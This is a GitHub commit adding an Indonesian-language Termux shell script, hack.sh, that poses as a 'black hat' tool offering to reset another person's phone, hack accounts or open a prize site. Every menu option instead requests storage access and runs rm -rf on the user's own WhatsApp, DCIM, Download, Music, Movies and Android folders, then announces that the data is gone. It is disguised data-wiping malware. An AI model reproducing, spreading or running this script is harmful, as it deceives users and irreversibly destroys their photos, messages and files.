44fbacd9267123b7383ef5c528ddb63b17e4e2c0
MrVirusSpm-07 <81134812+MrVirusSpm-07@users.noreply.github.com>
2021-05-25 00:54:52 +0700

    Add files via upload

---
+++ hack.sh
@@ -0,0 +1,117 @@
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+clear
+echo
+sleep 1
+       xdg-open https://youtube.com/channel/UCJcJ5ZARYowKSZzgPWSxpcQ
+echo
+echo $green" __  __ ____   __     _____ ____  _   _ ____  "
+echo $green"|  \/  |  _ \  \ \   / /_ _|  _ \| | | / ___| "
+echo $green"| |\/| | |_) |  \ \ / / | || |_) | | | \___ \ "
+echo $green"| |  | |  _ <    \ V /  | ||  _ <| |_| |___) |"
+echo $green"|_|  |_|_| \_\    \_/  |___|_| \_\\___/|____/ "
+echo $blue
+    echo "(+) AUTHOR   : MR VIRUS SPM    (+)"
+    echo "(+) TEAM     : MAVIA TEKNOLOGI (+)"
+    echo "(+) TOOLS    : BLACK HAT       (+)"
+        echo
+            echo $purple
+    sleep 1
+echo "1). RISET HP ORANG"
+echo "2). APK HECK AKUN"
+echo "3). WEB BERHADIAH"
+    echo
+ echo
+read -p "masukan pilihan =======>  " durm
+if [ $durm = 1 ]
+then
+    clear
+sleep 1
+figlet -f slant "MR VIRUS"
+echo $yellow
+   echo "Author : Mr Virus Spm"
+   echo "Team   : MAVIA TRKNOLOGI"
+   echo "Pesan  : Newbie Dulu"
+sleep 2
+echo
+    echo "SEDANG DALAM PROSES"
+ termux-setup-storage
+sleep 1
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+echo "TUNGGU 5 DETIK"
+   sleep 5
+echo "DATA ANDA TELAH DIHAPUS"
+    echo "Laporkan kepada saya jika anda di jebak oleh orang"
+    echo "kontak : +62 882-1235-2864"
+fi
+if [ $durm = 2 ]
+then
+    clear
+sleep 1
+figlet -f slant "MR VIRUS"
+echo $green
+   echo "Author : Mr Virus Spm"
+   echo "Team   : MAVIA TRKNOLOGI"
+   echo "Pesan  : Newbie Dulu"
+sleep 2
+echo
+    echo "SEDANG DALAM PROSES"
+ termux-setup-storage
+sleep 1
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+    rm -rf cd /sdcard/Download
+    rm -rf cd /sdcard/Movies
+    rm -rf cd /sdcard/WhatsApp Business
+echo "TUNGGU 5 DETIK"
+   sleep 5
+echo "DATA ANDA TELAH DIHAPUS"
+    echo "Laporkan kepada saya jika anda di jebak oleh orang"
+    echo "kontak : +62 882-1235-2864"
+fi
+if [ $durm = 3 ]
+then
+clear
+sleep 1
+figlet -f slant "MR VIRUS"
+echo $purple
+   echo "Author : Mr Virus Spm"
+   echo "Team   : MAVIA TRKNOLOGI"
+   echo "Pesan  : Newbie Dulu"
+sleep 2
+echo
+    echo "SEDANG DALAM PROSES"
+ termux-setup-storage
+sleep 1
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+    rm -rf cd /storage/emulated/0/Android
+    rm -rf cd /storage/emulated/0/WhatsApp
+    rm -rf cd /storage/emulated/0/DCIM
+    rm -rf cd /storage/emulated/0/Music
+    rm -rf cd /storage/emulated/0/Vidio
+    rm -rf cd /storage/emulated/0/Download
+    rm -rf cd /storage/emulated/0/Movies
+echo "TUNGGU 5 DETIK"
+   sleep 5
+echo "DATA ANDA TELAH DIHAPUS"
+    echo "Laporkan kepada saya jika anda di jebak oleh orang"
+    echo "kontak : +62 882-1235-2864"
+fi
